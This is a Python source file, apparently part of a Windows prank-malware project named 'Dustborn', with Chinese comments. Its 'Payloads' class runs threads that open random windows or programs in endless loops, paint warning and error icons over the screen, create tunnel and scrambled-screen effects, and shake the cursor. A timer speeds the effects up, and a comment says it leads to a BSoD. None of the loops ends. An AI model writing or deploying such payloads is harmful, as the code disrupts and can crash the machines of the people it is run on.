"""
该模块用于 Dustborn 操作屏幕，其中包括随机弹出窗口、随机绘制图标、随机弹窗、隧道效果、鼠标漂移、随机截屏覆盖的操作。
"""

import os
import threading
from random import choice, randrange

from win32api import *  # type: ignore
from win32con import *  # type: ignore
from win32gui import *  # type: ignore

from Data import Data

# 初始化计时器部分，为 Payload 控速并适时 BSoD。
timeCurrent: int = 0
timeSubtract: int = 15000


class Payloads:
    """
    该类包含对屏幕操作的 Payload 函数，其中包括随机弹出窗口、随机绘制图标、随机弹窗、隧道效果、鼠标漂移、随机截屏覆盖的操作。
    """

    def __init__(self):
        """
        [已停用] 该方法获取屏幕的 Device Context，传入给后续的方法。
        """
        # self.hDC = GetDC(0)  # type: ignore
        # self.screen_width: int = int(GetSystemMetrics(0))  # type: ignore
        # self.screen_height: int = int(GetSystemMetrics(1))  # type: ignore
        pass

    @staticmethod
    def timer():
        """
        该函数为一个计时器，为下文 Payload 控速并适时 BSoD。
        """
        global timeCurrent
        global timeSubtract
        while timeCurrent < 15000:
            timeCurrent += 1
            Sleep(10)

    @staticmethod
    def random_windows():
        """
        该方法用于在屏幕上随机弹出窗口，包含网页和部分 Windows 工具。
        """
        global timeCurrent
        global timeSubtract
        while True:
            Sleep(timeSubtract - timeCurrent)
            os.system("start " + str(choice(Data.windows)))

    def error_drawing(self):
        """
        该方法用于在屏幕上随机绘制 警告 图标，在鼠标处随机绘制 错误 图标。
        """
        global timeCurrent
        global timeSubtract
        hDC = GetDC(0)  # type: ignore
        screen_width: int = int(GetSystemMetrics(0))  # type: ignore
        screen_height: int = int(GetSystemMetrics(1))  # type: ignore
        while True:
            DrawIcon(hDC, randrange(screen_width), randrange(screen_height),  # type: ignore
                     Data.warning_icon)
            for _ in range(0, 60):
                mouse_x, mouse_y = GetCursorPos()
                DrawIcon(hDC, mouse_x, mouse_y, Data.error_icon)  # type:ignore
                Sleep(10)

    def tunnel_effect(self):
        """
        该方法通过连续截图并贴上缩小的截图，使屏幕产生隧道效果。
        """
        global timeCurrent
        global timeSubtract
        hDC = GetDC(0)  # type: ignore
        screen_width: int = int(GetSystemMetrics(0))  # type: ignore
        screen_height: int = int(GetSystemMetrics(1))  # type: ignore
        while True:
            StretchBlt(hDC, 50, 50, screen_width - 100, screen_height - 100, hDC,  # type: ignore
                       0, 0, screen_width, screen_height, SRCCOPY)
            Sleep(150)

    @staticmethod
    def cursor_shake():
        """
        该方法使鼠标指针随机晃动。
        """
        global timeCurrent
        global timeSubtract
        hDC = GetDC(0)  # type: ignore
        screen_width: int = int(GetSystemMetrics(0))  # type: ignore
        screen_height: int = int(GetSystemMetrics(1))  # type: ignore
        while True:
            cur_x, cur_y = GetCursorPos()
            new_x = cur_x + (randrange(3) - 1) * randrange(int((timeCurrent + 1) / 2200 + 2))
            new_y = cur_y + (randrange(3) - 1) * randrange(int((timeCurrent + 1) / 2200 + 2))
            SetCursorPos((new_x, new_y))
            Sleep(10)

    def screen_puzzle(self):
        """
        该方法在屏幕随机位置截图，并以随机大小覆盖到随机位置。
        """
        global timeCurrent
        global timeSubtract
        hDC = GetDC(0)  # type: ignore
        screen_width: int = int(GetSystemMetrics(0))  # type: ignore
        screen_height: int = int(GetSystemMetrics(1))  # type: ignore
        while True:
            x1 = randrange(screen_width - 100)
            y1 = randrange(screen_height - 100)
            x2 = randrange(screen_width - 100)
            y2 = randrange(screen_height - 100)
            width = randrange(600)
            height = randrange(600)
            BitBlt(hDC, x1, y1, width, height, hDC, x2, y2, SRCCOPY)  # type: ignore
            Sleep(1000)


if __name__ == "__main__":
    payload_instance = Payloads()
    payload_methods = [
        payload_instance.timer,
        payload_instance.random_windows,
        payload_instance.error_drawing,
        payload_instance.tunnel_effect,
        # payload_instance.cursor_shake,
        payload_instance.screen_puzzle,
    ]

    threads = [threading.Thread(target=method) for method in payload_methods]

    for thread in threads:
        thread.start()


"""
if __name__ == "__main__":
    payload_instance = Payloads()
    payload_instance.screen_puzzle()
"""
